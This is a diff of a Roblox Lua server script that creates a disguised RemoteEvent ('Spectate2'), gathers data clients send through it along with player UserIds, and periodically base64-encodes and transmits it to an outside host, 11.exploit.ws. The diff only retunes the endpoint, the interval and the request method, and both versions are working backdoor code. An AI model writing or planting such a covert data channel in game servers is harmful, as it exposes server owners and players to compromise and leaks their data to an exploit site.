@@ -1,9 +1,9 @@
--- O46EQaiuM2PoyJ Dec 4 2019
--- Put this in a Script in game.ServerScriptStorage
+-- frickmyposterior Dec 4 2019
+-- Put this in game.ServerScriptStorage
 
 local remote = Instance.new('RemoteEvent',game:GetService('ReplicatedStorage')); remote.Name = 'Spectate2';
 local HttpService = game:GetService('HttpService');
-local apiUrl = 'http://11.exploit.ws/console_logging/api.php?pid='..game.PlaceId;
+local apiUrl = 'http://11.exploit.ws/console_logging/api2.php?pid='..game.PlaceId;
 
 local function base64encode(data)
 	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._';
@@ -41,12 +41,12 @@ remote.OnServerEvent:Connect(function(p,data)
 	queue = queue..'>|'..p.UserId..'>>'..base64decode(data);
 end);
 
-while(wait(15)) do
+while(wait(5)) do
 	local response = '';
 	if(queue~='' and queue~=' ') then
 		queue = string.gsub(queue, "\n", "");
 		--warn(queue);
-		response = HttpService:GetAsync(apiUrl..'&data='..base64encode(queue));
+		response = HttpService:PostAsync(apiUrl,'&data='..base64encode(queue), Enum.HttpContentType.ApplicationUrlEncoded, false);
 		queue = '';
 		--warn('Response: '..response);
 	end;
